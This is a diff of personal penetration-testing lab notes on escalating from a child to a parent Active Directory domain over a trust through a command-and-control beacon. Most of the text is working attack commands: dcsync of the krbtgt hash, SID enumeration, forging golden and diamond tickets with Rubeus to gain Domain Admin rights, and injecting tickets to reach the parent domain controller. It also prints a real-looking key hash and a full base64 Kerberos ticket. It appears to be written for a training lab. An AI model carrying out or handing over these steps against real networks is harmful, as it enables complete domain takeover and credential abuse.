@@ -62,12 +62,12 @@ PARENT CHILD TRUST LAB (High Integrity beacon)
 1 - Enumerate trust:  ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
 2 - Obtain the aes25 hash for child domain krbtgt account:  dcsync child.parent.com Child\krbtgt <--domain
 --- 2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9
-3 - Obtain domain sid for child: ldapsearch (objectClass=domain) --attributes objectSid  <--This is actually found as well with the full SID and RID with the dcsync
+3 - Obtain domain sid for child: ldapsearch (objectClass=domain) --attributes objectSid  
 -- objectSid: S-1-5-21-690277740-3036021016-2883941857-502 <-- missing with the ldap
 4 - Obtain Domain Sid for Parent: ldapsearch (objectClass=domain) --attributes objectSid --hostname domain_controller.domain.com --dn DC=domain,DC=com
 -- objectSid: S-1-5-21-3926355307-1661546229-813047887
 5 - Forge Golden ticket on Attacker desktop
--- C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:child.domain.com /sid:[child SID] /sids:[Parent SID] /aes256:[CHILD KRBTGT HASH] /outfile:C:\Users\Attacker\Desktop\golden
+-- C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:child.domain.com /sid:[child SID] /sids:[Parent SID-512] /aes256:[CHILD KRBTGT HASH] /outfile:C:\Users\Attacker\Desktop\golden <--512 DOMAIN ADMIN
 -- C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\gold
 6- Inject ticket into Beacon: 
 -- kerberos_ticket_use C:\Users\Attacker\Desktop\[TICKET]
@@ -75,7 +75,7 @@ PARENT CHILD TRUST LAB (High Integrity beacon)
 8 - Access parent dc
 -- ls \\lon-dc-1\c$
 
-** IF GOLDEN DONT WORK USE DIAMOND **
+** IF GOLDEN DONT WORK USE DIAMOND ** NEEDS FIXED
 
 /tgtdeleg gets a usable TGT for the current user.
 /ticketuser is the user you want to impersonate.
@@ -85,7 +85,8 @@ PARENT CHILD TRUST LAB (High Integrity beacon)
 
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:domain_SID-512 /krbkey:CHILD_AESHASH_Krbtgt /nowrap
 - execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
-
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /user:Adinistrator /ticket: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
+ /service:CIFS/lon-dc-1
 
 
 
